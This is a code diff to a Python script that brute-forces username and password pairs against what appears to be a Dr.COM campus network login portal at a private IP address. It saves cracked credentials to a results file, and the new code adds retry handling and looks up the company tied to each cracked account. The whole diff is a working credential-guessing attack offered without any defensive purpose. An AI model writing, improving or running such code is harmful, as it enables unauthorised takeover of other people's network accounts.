@@ -5,6 +5,8 @@ import time
 
 import requests
 
+import verify
+
 file1 = open('username.txt', mode='r', encoding='utf-8')
 file2 = open('password.txt', mode='r', encoding='utf-8')
 
@@ -24,20 +26,38 @@ def dump_password():
 
 
 def brute(session, username: str, password: str):
+    try:
+        session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
+    except:
+        session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
     url = 'http://10.255.0.19/drcom/login?callback=dr1003&DDDDD=' + username + '&upass=' + password + '&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&v='
     headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Referer': 'http://10.255.0.19/a79.htm'}
-    r = session.get(url=url, headers=headers, verify=False)
+    try:
+        r = session.get(url=url, headers=headers, verify=False)
+    except:
+        time.sleep(1)
+        r = session.get(url=url, headers=headers, verify=False)
     print(str(r.status_code) + '\t' + str(len(r.text)) + '\t' +
           username + '\t' + password + '\t', end='\t')
     s = re.findall(r'\((.*?)\)', r.text)
     j = json.loads(s[0])
+    # print(j)
     status = j['result']
     print(status)
     if status == 1:
-        with open('result.txt', mode='a+') as f:
-            f.write(username + '\t' + password + '\n')
+        try:
             session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
+        except:
+            time.sleep(1)
+            session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
+        company = verify.get_company(session, username, password)
+        # print(str(status) + company, end='\n')
+        with open('result.txt', mode='a+') as f:
+            if company == None:
+                f.write(username + '\t' + password + '\n')
+            else:
+                f.write(username + '\t' + password + '\t' + company + '\n')
 
 
 def choose_mode(mode: int):
@@ -47,9 +67,10 @@ def choose_mode(mode: int):
     if mode == 1:
         for username in dic_username:
             for password in dic_password:
-                t = threading.Thread(target=brute, args=(session, username, password))
-                t.start()
-                time.sleep(0.005)
+                brute(session, username, password)
+                # t = threading.Thread(target=brute, args=(session, username, password))
+                # t.start()
+                # time.sleep(0.05)
     elif mode == 2:
         for username in dic_username:
             i = 0
